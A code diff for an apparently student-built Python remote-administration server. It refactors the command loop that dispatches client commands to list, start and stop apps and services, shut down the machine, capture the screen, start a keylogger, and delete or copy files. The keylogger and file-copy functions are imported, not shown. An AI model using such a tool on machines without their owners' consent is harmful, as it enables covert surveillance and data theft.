@@ -7,7 +7,6 @@ from Xuly_Chucnang.Keylogger.SV_keylogger import start_keylogger
 from Xuly_Chucnang.Monitor.SV_monitor import monitor
 from Xuly_Chucnang.Services_process.SV_services_process import list_running_services, start_service, stop_service
 from Xuly_Chucnang.Shutdown_reset.SV_shutdown_reset import reset_server, shutdown_server
-from module_support import receive_response
 
 def main():
     server_ip = socket.gethostbyname(socket.gethostname())
@@ -50,56 +49,57 @@ def main():
 def handle_client(client_socket):
     #Xử lý các lệnh từ client.
     try:
-        while True:                      
-            if not receive_response(client_socket):
+        while True:       
+            buffer = client_socket.recv(1024).decode()              
+            if not buffer:
                 print("Loi ket noi den Client hoac ket noi da dong.")
                 break
-            print(f"Lenh da nhan: {receive_response(client_socket)}")
+            print(f"Lenh da nhan: {buffer}")
            
             # List / Start / Stop các Applications đang chạy SERVER
-            if receive_response(client_socket).startswith("LIST_APPS_RUNNING"):
+            if buffer.startswith("LIST_APPS_RUNNING"):
                 list_apps_running(client_socket) 
-            elif receive_response(client_socket).startswith("START_APP_BY_PATH"):
-                app_path = receive_response(client_socket).split(" ",1)[1]
+            elif buffer.startswith("START_APP_BY_PATH"):
+                app_path = buffer.split(" ",1)[1]
                 start_app_by_path(client_socket, app_path)                 
-            elif receive_response(client_socket).startswith("STOP_APP"):
-                pid = int(receive_response(client_socket).split()[1])
+            elif buffer.startswith("STOP_APP"):
+                pid = int(buffer.split()[1])
                 stop_app(client_socket, pid)
                 
             # List / Start / Stop Services (Processes) đang chạy SERVER
-            elif receive_response(client_socket).startswith("LIST_SERVICE_RUNNING"):
+            elif buffer.startswith("LIST_SERVICES_RUNNING"):
                 list_running_services(client_socket)           
-            elif receive_response(client_socket).startswith("START_SERVICE"):
-                service_name = receive_response(client_socket).split(" ",1)[1]
+            elif buffer.startswith("START_SERVICE"):
+                service_name = buffer.split(" ",1)[1]
                 start_service(client_socket, service_name)
-            elif receive_response(client_socket).startswith("STOP_SERVICE"):
-                service_name = receive_response(client_socket).split(" ",1)[1]
+            elif buffer.startswith("STOP_SERVICE"):
+                service_name = buffer.split(" ",1)[1]
                 stop_service(client_socket, service_name) 
             
             # Shutdown / Reset máy SERVER
-            elif receive_response(client_socket) == "SHUTDOWN_SERVER":
+            elif buffer == "SHUTDOWN_SERVER":
                 shutdown_server(client_socket)
-            elif receive_response(client_socket) == "RESET_SERVER":
+            elif buffer == "RESET_SERVER":
                 reset_server(client_socket)
             
             
             # Xem màn hình hiện thời của máy SERVER
-            elif receive_response(client_socket).startswith("SCREEN_CAPTURING"):
+            elif buffer.startswith("VIEW_MONITOR"):
                 monitor(client_socket)
                 
             # Khóa / Bắt phím nhấn (keylogger) ở máy SERVER
-            elif receive_response(client_socket).startswith("START_KEY_LOGGER"):
+            elif buffer.startswith("START_KEYLOGGER"):
                 print("Starting keylogger...")                
                 start_keylogger(client_socket)
-            elif receive_response(client_socket) == "STOP_KEY_LOGGER":
+            elif buffer == "STOP_KEYLOGGER":
                 print("Keylogger stopped")  
                         
             # Xóa files ; Copy files từ máy SERVER
-            elif receive_response(client_socket).startswith("DELETE_FILE"):
-                file_path = receive_response(client_socket).split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
+            elif buffer.startswith("DELETE_FILE"):
+                file_path = buffer.split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
                 delete_file(client_socket, file_path)
-            elif receive_response(client_socket).startswith("COPY_FILE"):
-                file_path = receive_response(client_socket).split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
+            elif buffer.startswith("COPY_FILE"):
+                file_path = buffer.split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
                 copy_file(client_socket, file_path)
             else:
                 print("Khong biet lenh vua nhan tu may Client.")
